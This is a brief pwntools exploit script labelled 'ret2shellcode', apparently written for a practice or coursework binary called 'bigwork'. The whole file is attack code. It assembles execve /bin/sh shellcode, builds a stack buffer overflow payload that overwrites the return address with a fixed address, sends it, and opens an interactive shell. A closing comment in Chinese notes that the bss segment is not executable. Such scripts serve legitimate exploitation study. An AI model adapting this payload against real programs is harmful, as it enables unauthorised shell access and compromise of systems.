# ret2shellcode
from pwn import *
context(arch = "amd64", os = "linux")

p = process('../src/bigwork')
code = "mov rbx,0x68732f2f6e69622f\npush rbx\npush rsp\npop rdi\nxor esi, esi\nxor edx, edx\npush 0x3b\npop rax\nsyscall\n"

shellcode = asm(code)
buf_addr = p64(0x403580) 

pyload = shellcode + ('a' * (48 - len(shellcode)) + 'b' * 8).encode() + buf_addr

p.sendline("1".encode())
p.sendline(pyload)

p.interactive()


# bss段无运行权限